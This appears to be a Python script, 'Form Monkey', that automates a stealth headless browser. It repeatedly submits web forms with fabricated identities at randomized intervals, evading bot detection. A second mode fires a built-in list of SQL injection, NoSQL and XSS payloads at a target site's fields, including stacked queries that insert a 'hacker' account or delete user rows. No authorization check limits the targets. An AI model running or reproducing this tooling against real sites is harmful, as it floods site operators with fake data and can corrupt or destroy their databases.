#!/usr/bin/env python3
import json
import random
import logging
import argparse
import time
import sys
import os
import re
from datetime import datetime
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Load configuration files
try:
    with open('form_config.json', 'r') as f:
        FORM_CONFIG = json.load(f)
    with open('random_data.json', 'r') as f:
        RANDOM_DATA = json.load(f)
except Exception as e:
    logging.error(f"Error loading configuration: {e}")
    sys.exit(1)

# Global configuration
FORM_CONFIG_NAME = None
FORM_CONFIG_DATA = None
VERBOSITY = "balanced"

# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = {
    "basic": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1'; --",
        "admin' --",
        "admin' #"
    ],
    "error": [
        "' AND 1=CONVERT(int,(SELECT @@VERSION)) --",
        "' AND 1=CONVERT(int,'a') --",
        "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3) --"
    ],
    "time": [
        "'; WAITFOR DELAY '0:0:2' --",
        "'; IF 1=1 WAITFOR DELAY '0:0:2' --"
    ],
    "stacked": [
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
        "'; DELETE FROM users WHERE username='test'; --"
    ],
    "complex": [
        "' AND (SELECT 'x' FROM USERS WHERE 1=1 AND ROWNUM<2) IS NOT NULL --",
        "' HAVING 1=1 --",
        "' GROUP BY columnnames HAVING 1=1 --"
    ],
    "nosql": [
        "' || 1==1",
        "' && 1==1",
        "'; return true; var foo='"
    ],
    "xss": [
        "'><script>alert(1)</script>",
        "' UNION SELECT '<script>alert(1)</script>', NULL, NULL, NULL --"
    ],
    "encoding": [
        "'%20OR%20'1'%3D'1'",
        "' UNION%20SELECT%20'1'%2C'2'%2C'3'%2C'4'--"
    ]
}

def setup_driver():
    """Set up and configure the undetected Chrome WebDriver."""
    try:
        logging.info("Setting up undetected Chrome WebDriver...")
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        driver = uc.Chrome(options=options)
        driver.set_window_size(1920, 1080)
        return driver
    except Exception as e:
        logging.error(f"Failed to set up WebDriver: {e}")
        sys.exit(1)

def get_random_name():
    """Generate a random name."""
    names = RANDOM_DATA['names']
    return random.choice(names)

def generate_random_username():
    """Generate a random username."""
    username_parts = [
        random.choice(RANDOM_DATA['common_words']),
        random.choice(RANDOM_DATA['random_values']['chars']) * random.randint(1, 3),
        str(random.randint(1, 9999))
    ]
    random.shuffle(username_parts)
    return ''.join(username_parts)

def generate_email(first_name, last_name):
    # Increase probability of name-based emails to 70%
    if random.random() < 0.7:  # 70% chance of using name-based email
        # Create variations of the email username
        username_variations = [
            # Common name-based patterns (higher weight)
            f"{first_name.lower()}{random.randint(1, 999)}",  # john123
            f"{first_name.lower()[0]}{last_name.lower()}{random.randint(1, 99)}",  # jsmith45
            f"{first_name.lower()}{random.choice(['.', '_', ''])}{last_name.lower()}{random.randint(1, 99)}",  # john.smith45
            f"{first_name.lower()}{random.choice(['.', '_', ''])}{last_name.lower()[:3]}{random.randint(1, 999)}",  # john.smi123
            
            # Year-based variations (common for older users)
            f"{first_name.lower()}{random.choice(['.', '_', ''])}{random.choice(['19', '20'])}{random.randint(70, 99)}",  # john.1995
            f"{first_name.lower()}{random.choice(['.', '_', ''])}{last_name.lower()}{random.choice(['19', '20'])}{random.randint(70, 99)}",  # john.smith1995
            
            # Initial-based variations
            f"{first_name.lower()[0]}{random.choice(['.', '_', ''])}{last_name.lower()}{random.randint(1, 999)}",  # j.smith123
            f"{first_name.lower()[0]}{last_name.lower()}{random.randint(1, 999)}",  # jsmith123
            
            # Common special character patterns
            f"{first_name.lower()}{random.choice(['.', '_', '-'])}{random.randint(1, 999)}",  # john.123
            f"{first_name.lower()}{random.choice(['.', '_', '-'])}{last_name.lower()[:2]}{random.randint(1, 999)}",  # john.sm123
            
            # Mixed case variations (less common but still believable)
            f"{first_name.lower()}{random.choice(['.', '_', ''])}{last_name.lower().capitalize()}{random.randint(1, 99)}",  # john.Smith45
            
            # Short variations
            f"{first_name.lower()[:2]}{last_name.lower()[:2]}{random.randint(1, 999)}",  # josm123
            f"{first_name.lower()[0]}{last_name.lower()[:3]}{random.randint(1, 999)}",  # jsmi123
            
            # Common word additions
            f"{first_name.lower()}{random.choice(['.', '_', ''])}{random.choice(['dev', 'admin', 'user', 'test'])}{random.randint(1, 999)}",  # john.dev123
            f"{first_name.lower()}{random.choice(['.', '_', ''])}{last_name.lower()}{random.choice(['dev', 'admin', 'user', 'test'])}{random.randint(1, 999)}",  # john.smith.dev123
            
            # Date-based variations
            f"{first_name.lower()}{random.choice(['.', '_', ''])}{random.randint(1, 31)}{random.randint(1, 12)}{random.randint(70, 99)}",  # john.151295
            f"{first_name.lower()}{random.choice(['.', '_', ''])}{last_name.lower()}{random.randint(1, 31)}{random.randint(1, 12)}{random.randint(70, 99)}",  # john.smith151295
        ]
        username = random.choice(username_variations)
    else:
        # 30% chance of using completely random username
        username = generate_random_username()
    
    # Choose from common email domains with realistic weights
    domain_weights = {
        'gmail.com': 0.4,      # 40% chance
        'yahoo.com': 0.15,     # 15% chance
        'hotmail.com': 0.15,   # 15% chance
        'outlook.com': 0.1,    # 10% chance
        'aol.com': 0.05,       # 5% chance
        'icloud.com': 0.05,    # 5% chance
        'protonmail.com': 0.05, # 5% chance
        'live.com': 0.05       # 5% chance
    }
    
    domain = random.choices(list(domain_weights.keys()), weights=list(domain_weights.values()))[0]
    return f"{username}@{domain}"

def generate_phone():
    area_code_type = FORM_CONFIG_DATA['fields']['phone'].get('area_code_type', 'canadian')
    # Handle both single string and list of area code types
    if isinstance(area_code_type, list):
        area_code_type = random.choice(area_code_type)
    
    area_codes = RANDOM_DATA['area_codes'][area_code_type]
    area_code = random.choice(area_codes)
    
    # Generate phone number based on country format
    if area_code_type in ['canadian', 'american']:
        # North American format: (XXX) XXX-XXXX
        prefix = random.randint(200, 999)
        line_number = random.randint(1000, 9999)
        return f"({area_code}) {prefix}-{line_number}"
    elif area_code_type == 'russian':
        # Russian format: +7 (XXX) XXX-XX-XX
        prefix = random.randint(100, 999)
        line_number = random.randint(1000, 9999)
        return f"+7 ({area_code}) {prefix}-{line_number//100}-{line_number%100}"
    elif area_code_type == 'chinese':
        # Chinese format: +86 XXX XXXX XXXX
        prefix = random.randint(100, 999)
        line_number = random.randint(1000, 9999)
        return f"+86 {area_code} {prefix} {line_number}"
    elif area_code_type == 'mexican':
        # Mexican format: +52 (XXX) XXX-XXXX
        prefix = random.randint(100, 999)
        line_number = random.randint(1000, 9999)
        return f"+52 ({area_code}) {prefix}-{line_number}"
    elif area_code_type == 'uk':
        # UK format: +44 XXXX XXXXXX
        prefix = random.randint(1000, 9999)
        line_number = random.randint(100000, 999999)
        return f"+44 {area_code}{prefix} {line_number}"
    elif area_code_type == 'australian':
        # Australian format: +61 X XXXX XXXX
        prefix = random.randint(1000, 9999)
        line_number = random.randint(1000000, 9999999)
        return f"+61 {area_code} {prefix} {line_number}"
    else:
        # Default format if country not recognized
        prefix = random.randint(200, 999)
        line_number = random.randint(1000, 9999)
        return f"{area_code}{prefix}{line_number}"

def submit_form(driver, url, fields):
    """Fill and submit a form with random data."""
    try:
        # Load the form page
        driver.get(url)
        
        # Generate random form data
        first_name = get_random_name()
        last_name = get_random_name()
        email = generate_email(first_name, last_name)
        phone = generate_phone()
        
        # Log the generated data if verbosity allows
        if VERBOSITY != "minimal":
            logging.info(f"Generated data: {first_name} {last_name}, {email}, {phone}")
        
        # Fill form fields
        for field_name, field_config in fields.items():
            if field_name == 'submit_button':
                continue
                
            selector = field_config.get('selector')
            if not selector:
                continue
                
            selector_type = field_config.get('type', 'css')
            by_type = By.CSS_SELECTOR if selector_type == 'css' else By.XPATH
            
            try:
                element = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((by_type, selector))
                )
                
                # Determine the value to fill based on field name
                if field_name == 'first_name':
                    element.send_keys(first_name)
                elif field_name == 'last_name':
                    element.send_keys(last_name)
                elif field_name == 'email':
                    element.send_keys(email)
                elif field_name == 'phone':
                    element.send_keys(phone)
                else:
                    # For any other field, use a generic value
                    min_length = field_config.get('min_length', 1)
                    element.send_keys("test" * max(1, min_length // 4))
                
                if VERBOSITY == "verbose":
                    logging.info(f"Filled field '{field_name}' with selector '{selector}'")
            except (TimeoutException, NoSuchElementException) as e:
                logging.warning(f"Could not find element for field '{field_name}': {e}")
        
        # Submit the form
        submit_selector = fields.get('submit_button', {}).get('selector')
        if submit_selector:
            submit_type = fields.get('submit_button', {}).get('type', 'css')
            by_submit_type = By.CSS_SELECTOR if submit_type == 'css' else By.XPATH
            
            try:
                submit_button = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((by_submit_type, submit_selector))
                )
                if VERBOSITY != "minimal":
                    logging.info("Submitting form...")
                submit_button.click()
                
                # Wait for submission to complete
                time.sleep(2)
                if VERBOSITY == "verbose":
                    logging.info(f"Form submitted at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                return True
            except (TimeoutException, NoSuchElementException) as e:
                logging.error(f"Could not find submit button: {e}")
                return False
        else:
            logging.warning("No submit button defined in config")
            return False
            
    except Exception as e:
        logging.error(f"Error submitting form: {e}")
        return False

def run_submission_mode():
    """Run in form submission mode."""
    logging.info("Starting form submission automation")
    logging.info("Configuration:")
    
    # Get timing configuration
    min_interval = FORM_CONFIG_DATA.get('timing', {}).get('min_interval', 180)
    max_interval = FORM_CONFIG_DATA.get('timing', {}).get('max_interval', 1800)
    
    # Override from environment or args if provided
    min_env = os.environ.get('MIN_INTERVAL', '')
    if min_env and min_env.strip():
        min_interval = int(min_env)
        
    max_env = os.environ.get('MAX_INTERVAL', '')
    if max_env and max_env.strip():
        max_interval = int(max_env)
    
    # Get the target URL
    url = os.environ.get('TARGET_URL', FORM_CONFIG_DATA.get('url'))
    if not url:
        logging.error("No URL specified in configuration or environment")
        sys.exit(1)
    
    # Log configuration if verbosity allows
    logging.info(f"  Min interval: {min_interval} seconds")
    logging.info(f"  Max interval: {max_interval} seconds")
    logging.info(f"  Target URL: {url}")
    logging.info(f"  Form configuration: {FORM_CONFIG_NAME}")
    
    # Set up the WebDriver
    driver = setup_driver()
    
    try:
        # Run initial submission
        submission_count = 0
        max_submissions = int(os.environ.get('MAX_SUBMISSIONS', 0))
        
        while True:
            submission_count += 1
            logging.info("\n" + "=" * 50)
            logging.info(f"Starting {'initial' if submission_count == 1 else 'next'} submission #{submission_count}")
            logging.info(f"Current time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Submit the form
            success = submit_form(driver, url, FORM_CONFIG_DATA.get('fields', {}))
            
            # Check if we've reached max submissions
            if max_submissions > 0 and submission_count >= max_submissions:
                logging.info(f"Reached maximum submissions ({max_submissions}). Exiting.")
                break
            
            # Calculate random interval for next submission
            interval = random.randint(min_interval, max_interval)
            end_time = datetime.now() + timedelta(seconds=interval)
            
            if success:
                logging.info(f"Form submitted successfully. Waiting {interval} seconds until next submission.")
                logging.info(f"Next submission scheduled at: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
                time.sleep(interval)
            else:
                logging.warning("Form submission failed. Retrying in 30 seconds.")
                time.sleep(30)
    
    except KeyboardInterrupt:
        logging.info("Process interrupted by user. Exiting.")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
    finally:
        driver.quit()

def test_sql_injection():
    """Run in SQL injection testing mode."""
    logging.info("Starting SQL injection testing")
    
    # Get the target URL
    url = os.environ.get('TARGET_URL', FORM_CONFIG_DATA.get('url'))
    if not url:
        logging.error("No URL specified in configuration or environment")
        sys.exit(1)
        
    # Get SQL injection settings
    sql_settings = FORM_CONFIG_DATA.get('sql_injection_settings', {})
    test_all_fields = sql_settings.get('test_all_fields', True)
    max_attempts_per_field = sql_settings.get('max_attempts_per_field', 0)  # 0 means test all payloads
    payload_categories = sql_settings.get('payload_categories', list(SQL_INJECTION_PAYLOADS.keys()))
    
    # Log configuration if verbosity allows
    logging.info(f"Target URL: {url}")
    logging.info(f"Form configuration: {FORM_CONFIG_NAME}")
    logging.info(f"Testing all fields: {test_all_fields}")
    if max_attempts_per_field > 0:
        logging.info(f"Max attempts per field: {max_attempts_per_field}")
    logging.info(f"Payload categories: {', '.join(payload_categories)}")
    
    # Set up the WebDriver
    driver = setup_driver()
    
    # Track results
    total_tests = 0
    suspicious_responses = []
    
    try:
        # For each text field, test with SQL injection payloads
        text_fields = {name: field for name, field in FORM_CONFIG_DATA.get('fields', {}).items() 
                      if name not in ['submit_button'] and field.get('type') != 'checkbox'}
        
        for field_name, field_config in text_fields.items():
            selector = field_config.get('selector')
            selector_type = field_config.get('type', 'css')
            
            if not selector:
                continue
            
            logging.info(f"Testing field '{field_name}' with selector: {selector}")
            
            # Combine payloads from selected categories
            payloads = []
            for category in payload_categories:
                if category in SQL_INJECTION_PAYLOADS:
                    payloads.extend(SQL_INJECTION_PAYLOADS[category])
            
            # Limit number of payloads if max_attempts is set
            if max_attempts_per_field > 0 and max_attempts_per_field < len(payloads):
                payloads = random.sample(payloads, max_attempts_per_field)
            
            # Test each payload
            for payload in payloads:
                total_tests += 1
                if VERBOSITY != "minimal":
                    logging.info(f"Testing payload #{total_tests}: {payload}")
                
                # Load the page
                driver.get(url)
                time.sleep(2)  # Wait for page to load
                
                # Find and fill the field
                by_type = By.CSS_SELECTOR if selector_type == 'css' else By.XPATH
                
                try:
                    element = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((by_type, selector))
                    )
                    element.clear()
                    element.send_keys(payload)
                    
                    # Fill other required fields with benign data
                    for other_name, other_field in FORM_CONFIG_DATA.get('fields', {}).items():
                        if other_name != field_name and other_name != 'submit_button' and other_field.get('required', False):
                            other_selector = other_field.get('selector')
                            other_type = other_field.get('type', 'css')
                            
                            if not other_selector:
                                continue
                                
                            by_other_type = By.CSS_SELECTOR if other_type == 'css' else By.XPATH
                            try:
                                other_element = WebDriverWait(driver, 5).until(
                                    EC.presence_of_element_located((by_other_type, other_selector))
                                )
                                other_element.clear()
                                other_element.send_keys("test data")
                            except (TimeoutException, NoSuchElementException):
                                if VERBOSITY == "verbose":
                                    logging.warning(f"Could not find element for field '{other_name}'")
                    
                    # Submit the form
                    submit_selector = FORM_CONFIG_DATA.get('fields', {}).get('submit_button', {}).get('selector')
                    submit_type = FORM_CONFIG_DATA.get('fields', {}).get('submit_button', {}).get('type', 'css')
                    
                    if submit_selector:
                        by_submit_type = By.CSS_SELECTOR if submit_type == 'css' else By.XPATH
                        try:
                            submit_button = WebDriverWait(driver, 5).until(
                                EC.element_to_be_clickable((by_submit_type, submit_selector))
                            )
                            submit_button.click()
                            time.sleep(2)  # Wait for form submission
                        except (TimeoutException, NoSuchElementException):
                            if VERBOSITY == "verbose":
                                logging.warning("Could not find submit button")
                    
                    # Check for signs of successful SQL injection
                    page_source = driver.page_source.lower()
                    error_patterns = [
                        'sql syntax', 'unclosed quotation', 'unterminated string',
                        'sql error', 'syntax error', 'mysql error', 'postgresql error',
                        'database error', 'odbc driver', 'ora-', 'line \d+', 'syntax error',
                        'unexpected end', 'warning:', 'invalid query', 'sql state',
                        'microsoft sql', 'postgres error', 'mysqli', 'mysql_query'
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, page_source):
                            alert_message = f"POTENTIAL SQL INJECTION VULNERABILITY DETECTED! Field: {field_name}, Payload: {payload}"
                            logging.critical(alert_message)
                            suspicious_responses.append({
                                'field': field_name,
                                'payload': payload,
                                'pattern_matched': pattern,
                                'url': url
                            })
                            break
                    
                except (TimeoutException, NoSuchElementException) as e:
                    if VERBOSITY == "verbose":
                        logging.warning(f"Could not find element for field '{field_name}': {e}")
                except Exception as e:
                    if VERBOSITY != "minimal":
                        logging.error(f"Error testing payload on field '{field_name}': {e}")
                
                # Brief pause between tests
                time.sleep(1)
                
            # Stop testing more fields if test_all_fields is False
            if not test_all_fields:
                break
    
    except KeyboardInterrupt:
        logging.info("Process interrupted by user. Generating report...")
    except Exception as e:
        logging.error(f"Error during SQL injection testing: {e}")
    finally:
        driver.quit()
    
    # Generate report
    logging.info(f"SQL Injection testing completed: {total_tests} tests executed")
    
    if suspicious_responses:
        logging.critical(f"FOUND {len(suspicious_responses)} POTENTIAL SQL INJECTION VULNERABILITIES!")
        for i, vuln in enumerate(suspicious_responses, 1):
            logging.critical(f"Vulnerability #{i}:")
            logging.critical(f"  Field: {vuln['field']}")
            logging.critical(f"  Payload: {vuln['payload']}")
            logging.critical(f"  Pattern Matched: {vuln['pattern_matched']}")
            logging.critical(f"  URL: {vuln['url']}")
    else:
        logging.info("No obvious SQL injection vulnerabilities detected")

def main():
    global FORM_CONFIG_NAME, FORM_CONFIG_DATA, VERBOSITY
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="Form Monkey - Automated Form Submission Tool")
    parser.add_argument('--config', '-c', type=str, 
                        help="Form configuration to use (default: from FORM_CONFIG env var or 'default')")
    parser.add_argument('--verbosity', '-v', choices=['minimal', 'balanced', 'verbose'],
                        help="Set logging verbosity (default: from configuration or 'balanced')")
    parser.add_argument('--min-interval', type=int,
                        help="Minimum time between submissions in seconds (overrides config)")
    parser.add_argument('--max-interval', type=int,
                        help="Maximum time between submissions in seconds (overrides config)")
    parser.add_argument('--url', type=str,
                        help="Override the URL from the configuration")
    args = parser.parse_args()
    
    # Set configuration name from args, env var, or default
    FORM_CONFIG_NAME = args.config or os.environ.get('FORM_CONFIG', 'default')
    
    # Check if configuration exists
    if FORM_CONFIG_NAME not in FORM_CONFIG:
        logging.error(f"Form configuration '{FORM_CONFIG_NAME}' not found")
        sys.exit(1)
    
    # Load the specific configuration
    FORM_CONFIG_DATA = FORM_CONFIG[FORM_CONFIG_NAME]
    
    # Override URL if provided
    if args.url:
        os.environ['TARGET_URL'] = args.url
    
    # Set verbosity from args, config, env var, or default
    VERBOSITY = args.verbosity or FORM_CONFIG_DATA.get('verbosity', None) or os.environ.get('VERBOSITY', 'balanced')
    
    # Set logging level based on verbosity
    if VERBOSITY == 'minimal':
        logging.getLogger().setLevel(logging.WARNING)
    elif VERBOSITY == 'verbose':
        logging.getLogger().setLevel(logging.DEBUG)
    else:  # balanced
        logging.getLogger().setLevel(logging.INFO)
    
    # Override intervals if provided
    if args.min_interval:
        os.environ['MIN_INTERVAL'] = str(args.min_interval)
    if args.max_interval:
        os.environ['MAX_INTERVAL'] = str(args.max_interval)
    
    # Determine the mode to run in
    mode = FORM_CONFIG_DATA.get('mode', 'submit')
    
    if mode == 'sql_inject':
        test_sql_injection()
    else:  # Default to submit mode
        run_submission_mode()

if __name__ == "__main__":
    from datetime import timedelta
    main() 